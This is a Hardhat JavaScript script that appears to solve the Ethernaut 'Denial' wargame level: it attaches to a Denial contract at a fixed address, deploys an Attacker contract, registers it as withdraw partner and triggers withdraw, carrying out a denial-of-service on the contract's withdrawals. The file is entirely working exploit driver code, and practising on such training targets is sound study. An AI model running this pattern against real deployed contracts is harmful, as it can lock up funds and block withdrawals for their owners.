const { ethers } = require("hardhat");

const DENIAL_CONTRACT_NAME = "Denial";
const DENIAL_CONTRACT_ADDRESS = "0x2181bde6bB349f9F3a8282D4e559284D8665EB41";
const ATTACKER_CONTRACT_NAME = "Attacker";

async function main() {
    const denialFactory = await ethers.getContractFactory(DENIAL_CONTRACT_NAME);
    const denialContract = denialFactory.attach(DENIAL_CONTRACT_ADDRESS);

    const attackerFactory = await ethers.getContractFactory(ATTACKER_CONTRACT_NAME);
    const attackerContract = await attackerFactory.deploy(denialContract.address);

    await attackerContract.deployed();

    const ATTACKER_CONTRACT_ADDRESS = attackerContract.address;
    console.log("Attacker Contract deployed at: ", ATTACKER_CONTRACT_ADDRESS);

    let tx = await denialContract.setWithdrawPartner(ATTACKER_CONTRACT_ADDRESS);
    await tx.wait();

    tx = await denialContract.withdraw();
    await tx.wait();
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})